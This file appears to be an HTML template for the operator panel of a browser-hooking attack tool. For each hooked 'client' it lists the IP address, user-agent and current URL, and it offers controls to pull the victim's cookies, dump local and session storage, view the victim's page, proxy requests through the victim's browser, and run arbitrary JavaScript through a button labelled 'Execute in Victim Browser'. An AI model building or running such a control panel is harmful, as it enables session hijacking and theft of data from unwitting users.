<h1>Client {{ client.id }}</h1>
<table class="table">
    <tr>
        <td>IP</td><td>{{ client.ip }}</td>
    </tr>
    <tr>
        <td>User-Agent</td><td>{{ client.ua }}</td>
    </tr>
    <tr>
        <td>Current URL</td><td>{{ client.url }}</td>
    </tr>
</table>

<form action="/client/{{ client.id }}/alert" method="post" id="alertform">
    <div class="controls">
        <div class="input-prepend">
            <span class="add-on"><i class="icon-comment"></i></span>
            <input type="text" name="message">
        </div>
    </div>
    <button class="btn" type="submit">Send Message</button>
</form>
<script>
    $("#alertform").ajaxify();
</script>

<form action="/client/{{ client.id }}/prompt" method="post" id="promptform">
    <div class="controls">
        <div class="input-prepend">
            <span class="add-on"><i class="icon-question-sign"></i></span>
            <input type="text" name="message">
        </div>
    </div>
    <button class="btn" type="submit">Request Answer</button>
    <div id="prompt_response" class="alert alert-info" style="display:none"></div>
</form>
<script>
    $("#promptform").ajaxify(function(data) {
        $("#prompt_response").text(data).show();
    });
</script>

<form action="/client/{{ client.id }}/cookies" method="post" id="cookieform">
    <button class="btn" type="submit">Get Cookies</button>
    <div id="cookie_response" style="display:none"></div>
</form>
<script>
    $("#cookieform").ajaxify(function(data) {
        var table = $("<table class=\"table\"><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody></tbody></table>");

        for(var i = 0; i < data.length; i++) {
            table.find("tbody").append($("<tr/>")
                .append($("<td/>").html(data[i][0]))
                .append($("<td/>").html(data[i][1]))
            );
        }
        $("#cookie_response").html(table).show();
    });
</script>

<form action="/client/{{ client.id }}/request" method="post" id="requestform">
    <label class="control-label" for="url">URL:</label>
    <div class="controls">
        <div class="input-prepend">
            <span class="add-on"><i class="icon-search"></i></span>
            <input type="text" name="url" id="url">
        </div>
    </div>
    <button class="btn" type="submit">Proxy</button>
    <div id="request_resp"></div>
</form>
<script>
    $("#requestform").ajaxify(function(url) {
        $("#request_resp").html($("<a target=\"_blank\"/>")
            .attr('href', url)
            .text(url)
        );
    });
</script>

<form action="/client/{{ client.id }}/execute" method="post" id="executeform">
    <textarea name="code"></textarea><br />
    <button class="btn" type="submit">Execute in Victim Browser</button>
    <div id="execute_resp"></div>
</form>
<script>
    $("#executeform").ajaxify(function(response) {
        var table = prettyPrint(response);
        $("#execute_resp").html(table);
    });
</script>

<form action="/client/{{ client.id }}/view" method="post" id="viewform">
    <button class="btn" type="submit">View page</button>
</form>
<script>
    $("#viewform").ajaxify(function(html) {
        var newWin = window.open('about:blank','preview');
        newWin.document.write(html);
    });
</script>

<form action="/client/{{ client.id }}/storage" method="post" id="storageform">
    <select name="type">
        <option value="local">Local Storage</option>
        <option value="session">Session Storage</option>
    </select>
    <button class="btn" type="submit">Get Storage</button>
    <div id="storage_response" style="display:none"></div>
</form>
<script>
    $("#storageform").ajaxify(function(response) {
        var table = prettyPrint(response);
        $("#storage_resp").html(table);
    });
</script>
